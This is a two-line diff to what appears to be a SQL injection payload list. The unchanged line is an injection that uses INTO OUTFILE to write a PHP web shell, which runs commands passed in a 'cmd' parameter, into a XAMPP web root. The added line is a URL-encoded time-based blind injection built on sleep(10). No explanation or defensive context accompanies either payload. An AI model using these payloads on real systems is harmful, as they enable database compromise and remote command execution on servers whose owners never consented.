@@ -1,1 +1,2 @@
 ' UNION SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/command.php'  -- -'
+'%2b(select*from(select(sleep(10)))a)%2b'
